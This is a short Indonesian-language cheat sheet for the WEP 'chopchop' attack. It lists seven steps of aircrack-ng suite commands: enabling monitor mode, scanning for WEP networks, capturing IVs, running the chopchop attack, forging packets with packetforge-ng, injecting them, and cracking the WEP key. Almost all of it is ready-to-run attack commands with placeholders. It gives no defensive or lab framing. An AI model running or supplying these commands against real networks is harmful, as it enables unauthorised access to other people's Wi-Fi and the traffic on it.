# Chopchop Attack

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WEP

```
airodump-ng --encrypt wep [interface]
```

#### 3. Capture IVs

```
airodump-ng --bssid [bssid] --channel [channel] --ivs --write [output] [interface]
```

#### 4. Jalankan Serangan Chopchop

```
aireplay-ng -4 -b [bssid] -h [mac_attacker] [interface]
```

#### 5. Buat Paket Palsu

```
packetforge-ng -0 -a [bssid] -h [mac_attacker] -k 255.255.255.255 -l 255.255.255.255 -y [file_xor] -w [output]
```

#### 6. Inject Paket

```
aireplay-ng -2 -r [output_packetforge] -h [mac_attacker] [interface]
```

#### 7. Crack Kunci WEP

```
aircrack-ng -1 [file_ivs]
```
